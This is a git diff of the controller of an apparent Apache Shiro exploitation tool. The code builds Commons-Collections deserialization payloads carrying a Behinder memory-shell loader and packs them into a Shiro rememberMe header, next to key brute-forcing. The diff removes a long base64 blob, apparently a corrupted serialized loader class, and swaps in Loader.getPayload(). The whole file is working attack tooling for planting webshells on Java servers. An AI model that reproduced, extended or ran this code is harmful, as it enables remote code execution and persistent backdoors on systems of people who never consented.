@@ -7,6 +7,7 @@ import cn.safe6.core.http.Response;
 import cn.safe6.core.jobs.BurstJob;
 import cn.safe6.payload.memshell.BehinderLoader;
 import cn.safe6.payload.memshell.BehinderLoader2;
+import cn.safe6.payload.memshell.Loader;
 import cn.safe6.util.*;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
@@ -162,8 +163,6 @@ public class Controller {
 
         gadget.setValue("CommonsCollectionsK1");
         gadget.setItems(gadgetData);
-        paramsContext.put("BehinderLoader", "W++/vSwg77+9LCDvv70sIO+/vSwgACwgACwgACwgNCwgACwg77+9LCAKLCAALCA9LCAALCDvv70sIAosIAAsIAMsIAAsIO+/vSwgBywgACwg77+9LCAKLCAALCArLCAALCDvv70sIAcsIAAsIO+/vSwgCiwgACwgKywgACwg77+9LCAKLCAALCDvv70sIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAosIAAsIAUsIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAosIAAsIO+/vSwgACwg77+9LCAILCAALCDvv70sIAosIAAsIDAsIAAsIO+/vSwgBywgACwgfSwgCiwgACwg77+9LCAALCDvv70sIAgsIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAgsIAAsIO+/vSwgCCwgACwg77+9LCAHLCAALCDvv70sIAgsIAAsIO+/vSwgCCwgACwg77+9LCAILCAALCDvv70sIAosIAAsIAUsIAAsIO+/vSwgCCwgACwg77+9LCAHLCAALCDvv70sIAssIAAsIBosIAAsIO+/vSwgCywgACwgGiwgACwg77+9LCAHLCAALCDvv70sIAgsIAAsIO+/vSwgBywgACwg77+9LCAKLCAALCAfLCAALCDvv70sIAcsIAAsIO+/vSwgCiwgACwgISwgACwg77+9LCAKLCAALCAhLCAALCDvv70sIAgsIAAsIO+/vSwgCiwgACwgISwgACwg77+9LCAHLCAALCDvv70sIAosIAAsICYsIAAsIO+/vSwgCiwgACwgJiwgACwg77+9LCAHLCAALCDvv70sIAgsIAAsIO+/vSwgBywgACwg77+9LCAHLCAALCBiLCAJLCAALCAyLCAALCDvv70sIAosIAAsICssIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAcsIAAsIO+/vSwgCiwgACwgKywgACwg77+9LCAHLCAALCDvv70sIAosIAAsIDIsIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAgsIAAsIO+/vSwgCiwgACwgKywgACwg77+9LCAHLCAALCDvv70sIAcsIAAsIO+/vSwgCiwgACwg77+9LCAALCDvv70sIAosIAAsIAMsIAAsIO+/vSwgBywgACwg77+9LCAKLCAALCA7LCAALCDvv70sIAcsIAAsIO+/vSwgASwgACwgBiwgPCwgaSwgbiwgaSwgdCwgPiwgASwgACwgAywgKCwgKSwgViwgASwgACwgBCwgQywgbywgZCwgZSwgASwgACwgDywgTCwgaSwgbiwgZSwgTiwgdSwgbSwgYiwgZSwgciwgVCwgYSwgYiwgbCwgZSwgASwgACwgEiwgTCwgbywgYywgYSwgbCwgViwgYSwgciwgaSwgYSwgYiwgbCwgZSwgVCwgYSwgYiwgbCwgZSwgASwgACwgBCwgdCwgaCwgaSwgcywgASwgACwgKiwgTCwgYywgbiwgLywgcywgYSwgZiwgZSwgNiwgLywgcCwgYSwgeSwgbCwgbywgYSwgZCwgLywgbSwgZSwgbSwgcywgaCwgZSwgbCwgbCwgLywgQiwgZSwgaCwgaSwgbiwgZCwgZSwgciwgTCwgbywgYSwgZCwgZSwgciwgOywgASwgACwgCCwgZywgZSwgdCwgRiwgaSwgZSwgbCwgZCwgASwgACwgOCwgKCwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgTywgYiwgaiwgZSwgYywgdCwgOywgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgUywgdCwgciwgaSwgbiwgZywgOywgKSwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgTywgYiwgaiwgZSwgYywgdCwgOywgASwgACwgBCwgdiwgYSwgciwgNSwgASwgACwgICwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgTiwgbywgUywgdSwgYywgaCwgRiwgaSwgZSwgbCwgZCwgRSwgeCwgYywgZSwgcCwgdCwgaSwgbywgbiwgOywgASwgACwgBCwgdiwgYSwgciwgMCwgASwgACwgEiwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgTywgYiwgaiwgZSwgYywgdCwgOywgASwgACwgBCwgdiwgYSwgciwgMSwgASwgACwgEiwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgUywgdCwgciwgaSwgbiwgZywgOywgASwgACwgBCwgdiwgYSwgciwgMiwgASwgACwgGSwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgciwgZSwgZiwgbCwgZSwgYywgdCwgLywgRiwgaSwgZSwgbCwgZCwgOywgASwgACwgBCwgdiwgYSwgciwgMywgASwgACwgESwgTCwgaiwgYSwgdiwgYSwgLywgbCwgYSwgbiwgZywgLywgQywgbCwgYSwgcywgcywgOywgASwgACwgDSwgUywgdCwgYSwgYywgaywgTSwgYSwgcCwgVCwgYSwgYiwgbCwgZSwgBywgACwg77+9LCAHLCAALCDvv70sIAcsIAAsIO+/vSwgASwgACwgCiwgRSwgeCwgYywgZSwgcCwgdCwgaSwgbywgbiwgcywgASwgACwgCSwgdCwgciwgYSwgbiwgcywgZiwgbywgciwgbSwgASwgACwgciwgKCwgTCwgYywgbywgbSwgLywgcywgdSwgbiwgLywgbywgciwgZywgLywgYSwgcCwgYSwgYywgaCwgZSwgLywgeCwgYSwgbCwgYSwgbiwgLywgaSwgbiwgdCwgZSwgciwgbiwgYSwgbCwgLywgeCwgcywgbCwgdCwgYywgLywgRCwgTywgTSwgOywgWywgTCwgYywgbywgbSwgLywgcywgdSwgbiwgLywgbywgciwgZywgLywgYSwgcCwgYSwgYywgaCwgZSwgLywgeCwgbSwgbCwgLywgaSwgbiwgdCwgZSwgciwgbiwgYSwgbCwgLywgcywgZSwgciwgaSwgYSwgbCwgaSwgeiwgZSwgciwgLywgUywgZSwgciwgaSwgYSwgbCwgaSwgeiwgYSwgdCwgaSwgbywgbiwgSCwgYSwgbiwgZCwgbCwgZSwgciwgOywgKSwgViwgASwgACwgLSwgTCwgYywgbywgbSwgLywgcywgdSwgbiwgLywgbywgciwgZywgLywgYSwgcCwgYSwgYywgaCwgZSwgLywgeCwgYSwgbCwgYSwgbiwgLywgaSwgbiwgdCwgZSwgciwgbiwgYSwgbCwgLywgeCwgcywgbCwgdCwgYywgLywgRCwgTywgTSwgOywgASwgACwgQiwgWywgTCwgYywgbywgbSwgLywgcywgdSwgbiwgLywgbywgciwgZywgLywgYSwgcCwgYSwgYywgaCwgZSwgLywgeCwgbSwgbCwgLywgaSwgbiwgdCwgZSwgciwgbiwgYSwgbCwgLywgcywgZSwgciwgaSwgYSwgbCwgaSwgeiwgZSwgciwgLywgUywgZSwgciwgaSwgYSwgbCwgaSwgeiwgYSwgdCwgaSwgbywgbiwgSCwgYSwgbiwgZCwgbCwgZSwgciwgOywgBywgACwg77+9LCABLCAALCDvv70sICgsIEwsIGMsIG8sIG0sIC8sIHMsIHUsIG4sIC8sIG8sIHIsIGcsIC8sIGEsIHAsIGEsIGMsIGgsIGUsIC8sIHgsIGEsIGwsIGEsIG4sIC8sIGksIG4sIHQsIGUsIHIsIG4sIGEsIGwsIC8sIHgsIHMsIGwsIHQsIGMsIC8sIEQsIE8sIE0sIDssIEwsIGMsIG8sIG0sIC8sIHMsIHUsIG4sIC8sIG8sIHIsIGcsIC8sIGEsIHAsIGEsIGMsIGgsIGUsIC8sIHgsIG0sIGwsIC8sIGksIG4sIHQsIGUsIHIsIG4sIGEsIGwsIC8sIGQsIHQsIG0sIC8sIEQsIFQsIE0sIEEsIHgsIGksIHMsIEksIHQsIGUsIHIsIGEsIHQsIG8sIHIsIDssIEwsIGMsIG8sIG0sIC8sIHMsIHUsIG4sIC8sIG8sIHIsIGcsIC8sIGEsIHAsIGEsIGMsIGgsIGUsIC8sIHgsIG0sIGwsIC8sIGksIG4sIHQsIGUsIHIsIG4sIGEsIGwsIC8sIHMsIGUsIHIsIGld");
-
 
     }
 
@@ -187,6 +186,8 @@ public class Controller {
             e.printStackTrace();
         }
     }
+
+
 
     @FXML
     public void burstKey(ActionEvent actionEvent) {
@@ -258,6 +259,8 @@ public class Controller {
             Method mtd = clazz.getMethod("getPayload", byte[].class);
 
             byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
+
+            System.out.println("payloadLen:"+payload.length);
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
             String encryptData;
@@ -332,16 +335,19 @@ public class Controller {
 
             //获取class的base64
             //String loaderData = GetByteCodeUtil.getEncodeData(BehinderLoader.class);
-            String loaderData = paramsContext.get("BehinderLoader").toString();
-            System.out.println(loaderData);
-            System.out.println("loaderData:"+loaderData.length());
-            byte[] behinderLoaderBytes = Base64.getDecoder().decode(loaderData);
+            //String loaderData = paramsContext.get("BehinderLoader").toString();
+            //String loaderData = Loader.getPayload();
+            //System.out.println(loaderData);
+            //System.out.println("loaderData:"+loaderData.length());
+           //byte[] behinderLoaderBytes = Base64.getDecoder().decode(loaderData);
+            byte[] behinderLoaderBytes = Loader.getPayload();
 
 
             //塞进cc链
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
             Method mtd = clazz.getMethod("getPayload", byte[].class);
             byte[] payload = (byte[]) mtd.invoke(null, behinderLoaderBytes);
+
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
 
